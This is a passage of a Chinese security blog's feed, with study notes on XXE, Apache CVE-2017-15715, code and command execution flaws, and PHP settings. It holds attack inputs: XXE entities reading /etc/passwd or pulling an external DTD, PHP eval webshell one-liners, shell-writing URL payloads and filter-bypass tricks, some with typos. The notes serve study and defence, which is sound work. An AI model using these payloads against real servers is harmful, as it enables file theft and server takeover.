&lt;/ul&gt;
&lt;p&gt;XML是一种可扩展标记语言 ，用来结构化、储存以及传输信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;XML的组成&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;XML由3个部分构成，它们分别是：X</summary>
      
    
    
    
    <category term="web基础" scheme="https://sinevil.github.io/categories/web%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="文本语言" scheme="https://sinevil.github.io/tags/%E6%96%87%E6%9C%AC%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>XXE</title>
    <link href="https://sinevil.github.io/2021/07/26/XXE/"/>
    <id>https://sinevil.github.io/2021/07/26/XXE/</id>
    <published>2021-07-26T08:23:26.000Z</published>
    <updated>2021-08-03T08:07:22.239Z</updated>
    
    <content type="html"><![CDATA[<h2> XXE漏洞 </h2><p><strong>什么是XEE</strong></p><p>XEE也称为XML外部实体注入漏洞，该漏洞发生在 应用程序解析XML输入时，没有禁止外部实体的加载。通过XML实体的SYSTEM关键词导致XML解析器可以从本地文件或者远程URI中获取数据。</p><p><strong>危害</strong></p><p>当XML引用外部实体时，通过构造的恶意内容，可导致读取任意文件，执行系统命令，探测内网端口，攻击内网网站等危害</p><p><strong>构造实体注入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#直接通过DTD外部实体声明</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">  &lt;!ENTITY b SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;name&gt;&amp;b;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"><span class="comment">#通过DTD文档引入外部DTD文档，再引入外部实体声明</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">  &lt;!ENTITY d SYSTEM <span class="string">&quot;http://192.168.17.3:3378/test.dtd&quot;</span>&gt;</span><br><span class="line">    %d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;name&gt;&amp;b;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"><span class="comment">#test.dtd</span></span><br><span class="line">&lt;!ENTITY b SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>漏洞利用</strong></p><ul><li>判断漏洞存在的方法</li></ul><ol><li>通过注入外部实体，通过bp抓包观察程序是如何传输数据的</li><li>尝试插入外部实体，观察回显</li><li>尝试插入外部地址的外部实体，观察是否有请求</li></ol><ul><li>漏洞情景分类</li></ul><ol><li>有回显</li></ol><p>可以直接在页面中看到payload的执行结果，直接利用进行敏感文件获取，直接输出结果</p><ol start="2"><li>无回显</li></ol><p>看不到payload的执行结果，可通过外带使用外带数据通道提取数据</p><p><strong>防范方法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用开发语言提供的禁用外部实体的方法</span><br><span class="line"><span class="comment">#php：</span></span><br><span class="line">xml_disable_entity_loader(<span class="literal">true</span>)</span><br><span class="line"><span class="comment">#java:</span></span><br><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newinstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2&gt; XXE漏洞 &lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;什么是XEE&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;XEE也称为XML外部实体注入漏洞，该漏洞发生在 应用程序解析XML输入时，没有禁止外部实体的加载。通过XML实体的SYSTEM关键词导致XML解析器可以从本地文件或者远程UR</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://sinevil.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="XML漏洞" scheme="https://sinevil.github.io/tags/XML%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Apache换行解析漏洞</title>
    <link href="https://sinevil.github.io/2021/07/25/apachejiexi/"/>
    <id>https://sinevil.github.io/2021/07/25/apachejiexi/</id>
    <published>2021-07-25T01:29:31.000Z</published>
    <updated>2021-07-27T01:27:40.560Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Apache换行解析漏洞(CVE-2017-15715)</strong></p><ul><li>影响版本</li></ul><p>Apache httpd 2.4.0 ~ 2.4.29</p><ul><li>原理</li></ul><p>apache在修复第一个后缀名解析漏洞时，用正则表达式匹配后缀。在正则表示式中，<code>$</code>用来匹配字符串结尾位置，但如果设置了RegExp对象的Multiline属性，则$也匹配<code>\n</code>或者<code>\r</code>,</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#httpd解析php文件的表达式</span></span><br><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"><span class="comment">#&lt;FilesMatch&gt; 中指定的表达式可以将“$”匹配到恶意文件名中的换行符，而不是仅匹配文件名的末尾。这可以在某些文件的上传被外部阻止的环境中被利用，但只能通过匹配文件名的尾随部分</span></span><br></pre></td></tr></table></figure><p>由于是黑名单匹配，所以我们的上传可以成功，并且在解析时会匹配换行符，我们访问时在php后加上%0a即可正常访问。</p><p><strong>漏洞复现</strong></p><ul><li>打开环境，可以清晰的发现是一个文件上传点，我们首先选择对其查看源码</li></ul><p><img src="/2021/07/25/apachejiexi/QQ%E6%88%AA%E5%9B%BE20210723104444.png" alt="QQ截图20210723104444"></p><ul><li>源码中并无法确认是属于什么类型的文件上传，但是文件上传只是一个站的其中一个功能，选择对这个站进行信息搜集</li></ul><p><img src="/2021/07/25/apachejiexi/QQ%E6%88%AA%E5%9B%BE20210725091747.png" alt="QQ截图20210725091747"></p><ul><li>发现其中间件有Apache，且Apache版本为2.4.10</li></ul><p><img src="/2021/07/25/apachejiexi/QQ%E6%88%AA%E5%9B%BE20210725102727.png" alt="QQ截图20210725102727"></p><ul><li>搜寻到Apache的换行解析漏洞，通过bp抓包上传一个一句话的<code>.php</code>文件并在其后缀加上换行符</li></ul><p><img src="/2021/07/25/apachejiexi/QQ%E6%88%AA%E5%9B%BE20210725092156.png" alt="QQ截图20210725092156"></p><ul><li>将其发包，通过phpinfo();函数判断其是否上传成功并获取shell</li></ul><p><img src="/2021/07/25/apachejiexi/QQ%E6%88%AA%E5%9B%BE20210725092319.png" alt="QQ截图20210725092319"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;Apache换行解析漏洞(CVE-2017-15715)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;影响版本&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Apache httpd 2.4.0 ~ 2.4.29&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;a</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://sinevil.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="中间件漏洞" scheme="https://sinevil.github.io/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>AWD攻防(持续)</title>
    <link href="https://sinevil.github.io/2021/07/23/AWD/"/>
    <id>https://sinevil.github.io/2021/07/23/AWD/</id>
    <published>2021-07-23T10:34:04.000Z</published>
    <updated>2021-07-23T11:00:33.680Z</updated>
    
    <content type="html"><![CDATA[<p><strong>第一次攻防实战</strong></p><ul><li>准备阶段，防御流程</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;第一次攻防实战&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;准备阶段，防御流程&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=</summary>
      
    
    
    
    <category term="实战" scheme="https://sinevil.github.io/categories/%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="AWD攻防" scheme="https://sinevil.github.io/tags/AWD%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>代码执行漏洞</title>
    <link href="https://sinevil.github.io/2021/07/23/daima/"/>
    <id>https://sinevil.github.io/2021/07/23/daima/</id>
    <published>2021-07-23T08:22:59.000Z</published>
    <updated>2021-08-08T08:56:33.139Z</updated>
    
    <content type="html"><![CDATA[<p><strong>代码执行漏洞</strong></p><ul><li>什么是代码执行漏洞</li></ul><p>当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能够控制这个字符串，将造成代码注入漏洞</p><ul><li>漏洞产生的原因</li></ul><p>应用程序本身过滤不严，用户可以通过请求将代码注入到应用中执行</p><ul><li>相关函数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python: <span class="built_in">exec</span></span><br><span class="line">php：<span class="built_in">eval</span>,assert,preg_replace(<span class="string">&#x27;/*/e&#x27;</span>,<span class="variable">$ret</span>=<span class="string">&quot;\\1&quot;</span>;<span class="string">&#x27;,$data);（PHP版本&lt;5.5.0）</span></span><br><span class="line"><span class="string">asp：eval,exevute.executeglobal</span></span><br><span class="line"><span class="string">jsp：jsp中没有php中的eval函数，但是可以使用反射机制，使用基于反射机制的表达式引擎，如0GNL，SpEL，MVEL等</span></span><br></pre></td></tr></table></figure><ul><li>漏洞分类</li></ul><p>换行代码的漏洞：eval assert<br>callback函数：preg_replace + /e模式<br>反序列化：unserialize()</p><ul><li>漏洞危害</li></ul><p>执行任意代码</p><p>获取shell，甚至控制服务器、</p><ul><li>具体操作</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#一句话</span></span><br><span class="line">http://www.xXx.com/News/detai1/id/&#123;<span class="variable">$&#123;@eval(S_ POST[a])&#125;</span>&#125;</span><br><span class="line"><span class="comment">#获取当前路径</span></span><br><span class="line">http://www.xxx.com/News/detail/id/&#123;<span class="variable">$&#123;print(getd)))&#125;</span>&#125;</span><br><span class="line"><span class="comment">#读取文件</span></span><br><span class="line">http://www.xx.com/News/detail/id/&#123;<span class="variable">$&#123;exit(var. dump(file_ get_ contents($_ POST[&#x27;f&#x27;])))&#125;</span>&#125;    POST的数据为: f=/etc/passwd</span><br><span class="line"><span class="comment">#写shell</span></span><br><span class="line">http://www.xxx.com/News/detail/id/&#123;<span class="variable">$&#123;exit(var._dump(file_ put_ contents($_ POST[&#x27;f&#x27;],$_POST[&#x27;d&#x27;])))&#125;</span>&#125;   POST的数据为: f=1.php&amp;d=&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_</span> POST[<span class="string">&#x27;aa&#x27;</span>])?&gt;</span><br></pre></td></tr></table></figure><ul><li>防范方法</li></ul><p>严格控制eval()函数的使用</p><p>字符串使用单引号包括可控代码,插入前使用addslashes转义</p><p>放弃使用preg_ replace 的e修饰符,使用preg_ <em>replace</em> callback()替换</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;代码执行漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;什么是代码执行漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能够控制这个字符串，将造成代码注入漏洞&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;漏洞产生的原因&lt;/li&gt;</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://sinevil.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="RCE" scheme="https://sinevil.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>命令执行漏洞</title>
    <link href="https://sinevil.github.io/2021/07/23/mingling/"/>
    <id>https://sinevil.github.io/2021/07/23/mingling/</id>
    <published>2021-07-23T07:46:24.000Z</published>
    <updated>2021-08-08T09:03:05.434Z</updated>
    
    <content type="html"><![CDATA[<p><strong>命令执行漏洞</strong></p><ul><li>什么是命令执行漏洞</li></ul><p>应用程序有时需要调用一些执行系统命令的函数，如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令。当黑客能控制这些函数的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞</p><ul><li>漏洞产生的原因</li></ul><p>(1):代码过滤不严或者无过滤。(没有过滤&amp;、&amp;&amp;、|、||等连接符)<br>(2):系统漏洞造成的命令执行，bash破壳漏洞，该漏洞可以构造环境变量的值来执行具有攻击力的脚本代码，会影响到bash交互的多种应用，如http、ssh和dhcp等。<br>(3):调用第三方组件，如php(system()、shell_exec()、exec()、eval())，java(struct2)，thinkphp(thinkphp是一个老牌的php)(比如一句话木马<?php @eval($_GET[cmd]); ?>)</p><ul><li>漏洞分类</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#代码层过滤不严</span></span><br><span class="line">商业应用的一些核心代码封装在二进制文件中 ,在web应用中通过system函数来调用:</span><br><span class="line">system(<span class="string">&quot;/bin/program - arg <span class="variable">$arg</span>&quot;</span>);</span><br><span class="line"><span class="comment">#系统的漏洞造成命令注入</span></span><br><span class="line">bash破壳漏洞(CVE.2014-6271)</span><br><span class="line"><span class="comment">#调用的第三方组件存在命令执行漏洞</span></span><br><span class="line">如WordPress中用来处理图片的ImageMagick组件，JAVA中的命令执行漏洞(struts2/ElasticsearchGroovy等)，ThinkPHP命令执行</span><br></pre></td></tr></table></figure><ul><li>漏洞危害</li></ul><p>反弹shell</p><p>执行系统命令，读写文档</p><p>控制网站甚至服务器</p><p>进一步的内网渗透</p><ul><li>常用管道符</li></ul> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Windows</span></span><br><span class="line"><span class="string">&quot;|&quot;</span>:无论前面的命令是否执行成功，直接执行后面的命令(并且只执行后面的命令，不显示前面的命令执行结果)。</span><br><span class="line"><span class="string">&quot;||&quot;</span>:如果前面的命令执行成功，则不执行后面的命令；如果前面的命令执行失败，则会执行后面的命令。</span><br><span class="line"><span class="string">&quot;&amp;&quot;</span>:如果前面的命令执行成功，则会接着去执行后面的语句；如果前面的语句执行失败，还会执行后面的语句。</span><br><span class="line"><span class="string">&quot;&amp;&amp;&quot;</span>:如果前面的命令执行成功，后面的命令也会执行；如果前面的命令执行失败，则会直接报错。</span><br><span class="line"><span class="comment">#Linux</span></span><br><span class="line"><span class="string">&quot;;&quot;</span>:执行完前面的命令再执行后面的命令。如果前面的命令执行成功，后面的命令也会执行；如果前面的命令执行失败，则会执行后面的命令。</span><br><span class="line"><span class="string">&quot;|&quot;</span>:无论前面的命令是否执行成功，直接执行后面的命令(并且只执行后面的命令，不显示前面的命令执行结果)。</span><br><span class="line"><span class="string">&quot;||&quot;</span>:如果前面的命令执行成功，则不执行后面的命令；如果前面的命令执行失败，则会执行后面的命令。</span><br><span class="line"><span class="string">&quot;&amp;&quot;</span>:如果前面的命令执行成功，则会接着去执行后面的语句；如果前面的语句执行失败，还会执行后面的语句。</span><br><span class="line"><span class="string">&quot;&amp;&amp;&quot;</span>:如果前面的命令执行成功，后面的命令也会执行；如果前面的命令执行失败，则会直接报错</span><br></pre></td></tr></table></figure><ul><li>常用指令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Windows</span></span><br><span class="line">dir----查看文件目录</span><br><span class="line">ipconfig----查看Windows的IP地址</span><br><span class="line">arp -a----查看ARP缓存表</span><br><span class="line">calc----在命令行打开计算器</span><br><span class="line">regedit----打开注册表</span><br><span class="line">netstat -ano----查看开放的端口信息</span><br><span class="line"><span class="comment">#Linux</span></span><br><span class="line">cat /etc/passwd----查看passwd文件</span><br><span class="line">id----查看该用户的ID号</span><br><span class="line">groups----查看用户所属的组</span><br><span class="line">cat /etc/group----查看组信息</span><br><span class="line">whoami----查看当前用户</span><br><span class="line"><span class="built_in">pwd</span>----查看当前路径</span><br><span class="line">uname -a----查看主机信息</span><br><span class="line">cat /etc/issue----查看主机的配置信息</span><br><span class="line">netstat -pantu----查看开放的端口信息</span><br><span class="line">netstat -nr----查看路由信息</span><br></pre></td></tr></table></figure><ul><li>绕过技巧</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cat的绕过</span></span><br><span class="line">cat 由第一行开始显示内容，并将所有内容输出</span><br><span class="line">tac 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line">head 只显示头几行</span><br><span class="line">tail 只显示最后几行</span><br><span class="line">nl 类似于cat -n，显示时输出行号</span><br><span class="line"></span><br><span class="line"><span class="comment">#绕过分隔符</span></span><br><span class="line">绕过分隔符: %0a换行符 %0d回车符 以及;(连续指令) &amp; | || &amp;&amp;</span><br><span class="line">在 shell 中，担任”连续指令”功能的符号就是”分号”</span><br><span class="line"></span><br><span class="line"><span class="comment">#绕过空格</span></span><br><span class="line">&lt; &lt;&gt;  <span class="variable">$&#123;IFS&#125;</span> $IFS<span class="variable">$9</span> </span><br><span class="line"><span class="variable">$IFS</span>在linux下表示分隔符，单纯的cat<span class="variable">$IFS</span>,bash解释器会把整个IFS当做变量名，所以导致输不出来结果，然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用，但是为什么要用<span class="variable">$9</span>呢，因为<span class="variable">$9</span>只是当前系统shell进程的第九个参数的持有者，它始终为空字符串</span><br><span class="line"></span><br><span class="line"><span class="comment">#绕过黑名单单词：</span></span><br><span class="line"><span class="string">&#x27;  &#x27;</span><span class="string">&#x27; \ *(补全符) 以及通过base64转码绕过</span></span><br></pre></td></tr></table></figure><ul><li>防范方法</li></ul><p>尽量少使用或禁用system，eval等执行命令的函数</p><p>在执行命令函数之前，对参数进行过滤，对敏感字符进行转义</p><p>参数值尽量用引号包括</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;命令执行漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;什么是命令执行漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;应用程序有时需要调用一些执行系统命令的函数，如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_po</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://sinevil.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="RCE" scheme="https://sinevil.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>PHP常用配置</title>
    <link href="https://sinevil.github.io/2021/07/22/phppeizhi/"/>
    <id>https://sinevil.github.io/2021/07/22/phppeizhi/</id>
    <published>2021-07-22T01:46:55.000Z</published>
    <updated>2021-07-26T11:40:20.319Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">语言相关配置</span><br><span class="line">engine  <span class="comment">#设置php引擎是否可用，默认值On</span></span><br><span class="line">short_open_tag  <span class="comment">#是否允许php脚本使用短开放标记，将&quot;&lt;?php ?&gt;&quot;改为&quot;&lt;? ?&gt;&quot;这个语法与XML相同，在某些情况下可能会导致问题，所以一般建议关闭</span></span><br><span class="line">asp_tags  <span class="comment">#是否支持ASP风格的脚本定界 &quot;&lt;% %&gt;&quot;</span></span><br><span class="line">precision  <span class="comment">#指定在浮点数表示中显示的有效数字，该项在win32系统中设置为14，linux中设置为12</span></span><br><span class="line">output_buffering  <span class="comment">#设置是否使用输出缓冲，或者设置输出缓冲区的大小。使用输出缓冲会使性能稍稍下降(output_buffering = &#x27;number&#x27;,output_buffering = On)</span></span><br><span class="line">output_handler  <span class="comment">#设置将输出返回给请求用户之前要把所有输出传输给一个函数。例如，假如你希望返回给浏览器之前先对所有输出进行压缩，可以将该项配置为PHP的压缩处理函数“ob_gzhsndler”</span></span><br><span class="line">zlib.output_compression  <span class="comment">#通过设置决定是否在输出返回浏览器之前先自动压缩，通过赋一个整数值，可以启用输出压缩，同时设置压缩缓冲罐区大小</span></span><br><span class="line">zlib.output_handler  <span class="comment">#如果zilb库不可用，该配置将指定一个特定的压缩库</span></span><br><span class="line">implicit_flush  <span class="comment">#启动时，每次调用print()或者echo()，以及完成各个嵌入的HTML块后，将自动清楚或刷新其内容的输出缓冲区，当服务器需要非常长的时间来编译结果或完成某些计算时，这可能很有用，在这些情况下，可以利用这个特征向用户输出状态更新，而不是等待服务器完成整个过程后才输出</span></span><br><span class="line">ignore_user_abort  <span class="comment">#是否设置即使在用户中止请求后也坚持完成整个请求，在执行一个长请求的时候应当考虑打开它，因为长请求可能会导致用户中途中止或浏览器超时，该配置项可以用于实现类似Unix的crontab(定时任务计划)功能</span></span><br><span class="line">zend.enable_gc  <span class="comment">#设置是否开启PHP的垃圾回收机制</span></span><br><span class="line">安全相关配置</span><br><span class="line">safe_mode</span><br><span class="line">safe_mode_gid</span><br><span class="line">safe_mode_include_dir</span><br><span class="line">safe_mode_exec_dir</span><br><span class="line">safe_mode_protected_env_vars</span><br><span class="line">open_basedir</span><br><span class="line">disable_functions</span><br><span class="line">disable_classes</span><br><span class="line">allow_url_include</span><br><span class="line">allow_url_fopen</span><br><span class="line">register_globals</span><br><span class="line">enable_dll</span><br><span class="line">cgi.force_redirect</span><br><span class="line">性能相关配置</span><br><span class="line">realpath_cache_size</span><br><span class="line">realpath_cache_ttl</span><br><span class="line">auto_globals_jit</span><br><span class="line">错误信息相关配置</span><br><span class="line">log_errors</span><br><span class="line">error_log</span><br><span class="line">error_reporting</span><br><span class="line">E_ALL</span><br><span class="line">E_ERROR</span><br><span class="line">E_WARNING</span><br><span class="line">E_PARSE</span><br><span class="line">E_NOTICE</span><br><span class="line">E_STRICT</span><br><span class="line">E_CORE_ERROR</span><br><span class="line">E_COMPILE_WARRING</span><br><span class="line">E_USER_ERROR</span><br><span class="line">E_USER_WARNING</span><br><span class="line">E_USER_NOTICE</span><br><span class="line">display_errors</span><br><span class="line">display_startup_errors</span><br><span class="line">track_errors</span><br><span class="line">log_errors_max_len</span><br><span class="line">ignore_repeated_errors</span><br><span class="line">ignore_repeated_source</span><br><span class="line">report_memleaks</span><br><span class="line">error_prepend_string</span><br><span class="line">error_append_string</span><br><span class="line">资源相关配置</span><br><span class="line">max_execution_time</span><br><span class="line">memory_execution_time</span><br><span class="line">max_input_nesting_level</span><br><span class="line">max_input_vars</span><br><span class="line">max_input_time</span><br><span class="line">default_socket_timeout</span><br><span class="line">pcre.backtrack_limit</span><br><span class="line">pcre.recursion_limit</span><br><span class="line">post_max_size</span><br><span class="line">数据处理相关配置</span><br><span class="line">allow_calltime_pass_reference</span><br><span class="line">register_argc_argv</span><br><span class="line">request_order</span><br><span class="line">variables_order</span><br><span class="line">arg_separator.output</span><br><span class="line">arg_separator.input</span><br><span class="line">auto_prepend_file和auto_append_file</span><br><span class="line">default_mimetype和default_charset</span><br><span class="line">文件上传相关配置</span><br><span class="line">file_uploads</span><br><span class="line">max_file_uploads</span><br><span class="line">upload_tmp_dir</span><br><span class="line">upload_max_filesize</span><br><span class="line">Session相关配置</span><br><span class="line">session.save_path</span><br><span class="line">session.save_handler</span><br><span class="line">session.use_cookies</span><br><span class="line">session.use_only_cookies</span><br><span class="line">session,name</span><br><span class="line">session,auto_start</span><br><span class="line">session.cookie_lifetime</span><br><span class="line">session.gc_probability和session.gc_divisor</span><br><span class="line">session.gc_maxlifetime</span><br><span class="line">session_trans_sid</span><br><span class="line">seaasion.bug_compat_42和session.bug_warn</span><br><span class="line">session.hash_bits_per_character</span><br><span class="line">url_rewrite.tags</span><br><span class="line">其他配置</span><br><span class="line">extension_dir</span><br><span class="line">extension</span><br><span class="line">date.timezone</span><br><span class="line">doc_root</span><br><span class="line">magic_quotes_gpc</span><br><span class="line">expose_php</span><br><span class="line">user_ini.filenmae和user_cache-ttl</span><br><span class="line">include_path</span><br><span class="line">sys_temp_dir</span><br><span class="line">cgi.nph</span><br><span class="line">SMTP</span><br><span class="line">smtp_port</span><br><span class="line">cgi.force_redirect</span><br><span class="line">cgi.fix_redirect</span><br><span class="line">cgi.fix_pathinfo</span><br><span 